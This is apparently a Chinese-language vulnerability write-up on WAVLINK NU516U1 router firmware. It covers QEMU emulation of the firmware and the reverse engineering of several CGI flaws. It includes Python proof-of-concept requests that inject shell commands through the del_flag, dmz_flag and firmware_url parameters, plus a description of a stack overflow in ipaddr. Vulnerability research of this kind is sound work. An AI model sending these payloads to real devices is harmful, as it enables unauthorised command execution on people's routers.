---
title: 'WAVLINK NU516 固件模拟与多处命令注入漏洞复现'
description: '记录 WAVLINK NU516 固件解包、MIPS QEMU 模拟、lighttpd 启动修复，以及 CVE-2026-2615、CVE-2026-3704 等命令注入漏洞复现。'
date: '2026-04-05 21:00'
tags:
  - CVE
  - IoT
  - firmware
  - command-injection
  - WAVLINK
  - QEMU
  - pwn
categories:
  - CVE
top_img: transparent
abbrlink: 360d2357
permalink: posts/wavlink-nu516-firmware-command-injection/
---
 
## 环境
[[CVE]]
[固件下载]([Firmware - WAVLINK ROUTER Docs](https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A))
WAVLINK-NU516-V251208
WAVLINK-NU516-V240425
Ubuntu25.10
IDA9.1
binwalk
qemu
firmwalker

## 固件仿真
binwalk解包
``` bash
binwalk -Me WAVLINK.bin 
```
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405211337658.png)
``` bash
readelf -h lighttpd
```
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405212457807.png)
mips小端序

## 固件模拟

在[下载](https://people.debian.org/~aurel32/qemu/armhf/)以下内容
``` bash
debian_squeeze_mipsel_standard.qcow2
vmlinux-3.2.0-4-4kc-malta
```

宿主机配置虚拟网卡
``` bash
sudo ip tuntap add mode tap name tap0
sudo ip addr add 192.168.10.1/24 dev tap0
sudo ip link set tap0 up
```

启动模拟
``` bash
qemu-system-mipsel \
  -M malta \
  -cpu 74Kf \
  -kernel /home/ming/下载/iot/WAVLINK25/vmlinux-3.2.0-4-4kc-malta \
  -hda /home/ming/下载/iot/WAVLINK25/debian_wheezy_mipsel_standard.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -net nic -net tap,ifname=tap0,script=no,downscript=no \
  -nographic
```
在模拟后的虚拟机配置网卡
``` bash
ifconfig eth0 192.168.10.200 netmask 255.255.255.0
```

将 `squashfs-root` 打包并传输到虚拟机
``` bash
tar -zcvf squashfs-root.gz squashfs-root
scp -O \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  squashfs-root.gz root@192.168.10.2:/
tar -zxvf squashfs-root.gz
```

挂载系统环境配置
``` bash
mount --bind /proc/ proc/
mount --bind /sys/ sys/
mount --bind /dev/ dev/
```

启动模拟
``` bash
chroot . /bin/sh
/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```

报错
``` bash
/ # /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
2026-04-05 13:42:40: (server.c.925) opening pid-file failed: /var/run/lighttpd.pid No such file or directory 
```
 `/var/run/`目录不存在或者 lighttpd 没有权限创建 pid 文件
 IoT设备通常使用**Flash**作为存储介质,原本`/var -> /tmp`指向目录下的/tmp但是在binwalk解包的时候，是直接解压，并没有还原连接，直接删掉原本的var和tmp重新创建即可
```bash
rm -rf /var
rm -rf /tmp
mkdir -p /var/run
mkdir -p /var/log/lighttpd
mkdir -p /tmp/run
mkdir -p /tmp/log/lighttpd
#再次启动
/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222402562.png)
模拟成功
这边为了使用bp，使用了NATBypass工具转发端口到win主机

## 漏洞复现
### CVE-2026-2615
漏洞描述
Wavlink NU516U1 路由器固件（版本 M16U1_V251208）中的 `/cgi-bin/firewall.cgi` 组件存在命令注入漏洞。该漏洞位于处理 端口转发删除（singlePortForwardDelete）功能的 `sub_4016D0` 函数中。厂商在处理 `del_flag` 参数时，调用了过滤函数 `sub_405B2C` 对用户输入进行检查。尽管该函数试图通过黑名单机制防止命令注入，但其实现不严谨，遗漏了关键的命令分隔符分号（`;`）。经过身份验证的远程攻击者可以通过构造包含分号的恶意 `del_flag` 参数，绕过输入验证，利用 `sprintf` 函数将任意 Shell 命令拼接到系统调用中执行。
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222847040.png)
`sub_4016D0` 漏洞函数点
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222941938.png)
`sub_405B2C`过滤函数，未将`;`进行过滤可以进行绕过注入命令执行
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223207487.png)
后续进入else，sprintf字符串拼接，随后带入到 `sub_403734`中，`sub_403734`有system执行
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223305360.png)
对`sub_4016D0`进行交叉引用，找到如何进入此危险函数
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223319731.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406181959526.png)
从请求中获取 `firewall`的参数，然后通过 `if` 判断使用 `strcmp` 去匹配对应的字符
poc，当匹配到 `singlePortForwardDelete` 时,进入到 `sub_4016D0`漏洞函数中
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406182236409.png)
再从中获取到 `del_flag`的值，进行后续的过滤、拼接操作

#### poc
``` python
import requests

url = "http://192.168.10.2/cgi-bin/firewall.cgi"
cookies = {"session": "1506085659"}
data = "firewall=singlePortForwardDelete&del_flag=1;touch+/tmp/ming2;"

r = requests.post(url, data=data, cookies=cookies,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5)
print(r.status_code, r.text[:200])
```
cookies的值需要获取
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405233350257.png)


### CVE-2026-3704
漏洞描述
Wavlink NU516U1 路由器固件（版本 M16U1_V251208）中的 `/cgi-bin/firewall.cgi` 组件存在命令注入漏洞。该漏洞位于处理 DMZ 设置的 `sub_4017F0` 函数中。尽管厂商引入了过滤函数 `sub_405B2C` 试图修复旧版本（M16U1_V240425）的漏洞，但该黑名单过滤机制不严谨，遗漏了关键的命令分隔符分号（`;`）。经过身份验证的远程攻击者可以通过构造包含分号的恶意 `dmz_flag` 参数，绕过输入验证，利用 `sprintf` 函数将任意 Shell 命令拼接到系统调用中执行。

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183135188.png)
危险函数 `sub_403734` 里面有 `system` 执行
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183208417.png)
且adc将v9进行了拼接操作
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183238969.png)
v9 是由 v6获取到的 `dmz_flag` 复制过来的
控制v6也就是控制输入的 `dmz_flag`值即可造成命令注入
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183355705.png)
调用到此漏洞函数的方法和上面一致
#### poc
``` python
import requests

url = "http://192.168.10.2/cgi-bin/firewall.cgi"
cookies = {"session": "1130347533"}
data = "firewall=DMZ&dmz_flag=1;touch+/tmp/ming4;"

r = requests.post(url, data=data, cookies=cookies,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5)
print(r.status_code, r.text[:200])
```
cookies的值需要获取

### CVE-2026-3612
漏洞描述
Wavlink NU516U1 路由器固件（版本 V240425）中的 `/cgi-bin/adm.cgi` 组件存在严重的命令注入漏洞。该漏洞位于处理 **OTA 在线升级（ota_new_upgrade）** 功能的 `sub_405AF4` 函数中。厂商在处理 `firmware_url` 参数时，直接将其拼接到系统命令中。尽管开发者试图使用双引号包裹参数以防止参数逃逸，但该防御方式无法阻止 Shell 命令替换。经过身份验证的远程攻击者可以通过构造包含 `$()` 或反引号的恶意 `firmware_url` 参数，绕过限制执行任意系统命令。
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406193253021.png)
分别获取 POST 请求中的 `brand`、`model`、`version`、`md5`、`firmware_url`，且都可以被我们控制输入，后续对v13进行字符串拼接 最后执行system
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406193901881.png)
调用到此漏洞函数的逻辑与上面类似
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406194000551.png)
获取请求数据 `page` 的值,然后通过 `if` 判断使用 `strcmp` 去匹配对应的字符
#### poc
``` python
import requests

url = "http://192.168.10.2/cgi-bin/adm.cgi"
cookies = {"session": "1033453068"}
headers = {
      "Host": "usblogin.link",
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "http://usblogin.link/html/firewall.shtml",
      "Origin": "http://usblogin.link",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/120.0.6099.71 Safari/537.36",
}
body = "page=ota_new_upgrade&brand=wavlink&model=123&version=1.0&md5=123456&firmware_url=$(touch /tmp/ming6)"

r = requests.post(url, data=body, headers=headers, cookies=cookies, timeout=5)
print(r.status_code, r.text[:200])
```

### CVE-2026-3613
漏洞描述
在 Wavlink NU516U1 V240425 版本的固件中，`/cgi-bin/login.cgi` 组件的 `sub_401A0C` 函数存在栈缓冲区溢出漏洞。该函数主要用于处理 `sys_login1` 页面请求。函数内部在栈上定义了一个固定大小为 128 字节的缓冲区 `v15`。在验证密码 MD5 通过后，程序使用 `sprintf` 函数构造一条系统命令，将用户输入的 `ipaddr` 参数直接拼接到该缓冲区中。由于 `sprintf` 没有限制写入数据的长度，且程序未对 `ipaddr` 的长度进行校验，攻击者可以发送一个超长的字符串（超过约 105 字节）。当超长的 `ipaddr` 数据被写入 `v15` 时，会发生越界写入，覆盖栈上相邻的局部变量、保存的寄存器以及函数的返回地址,导致 CGI 进程崩溃。

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200258409.png)
 读取配置里的管理员密码
 获取请求数据中的 `ipaddr`、`password`
 ![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200530566.png)
在后续中字符串拼接给 `v15`![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200628026.png)
且 `v15` 可以溢出
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406202202818.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406202222987.png)
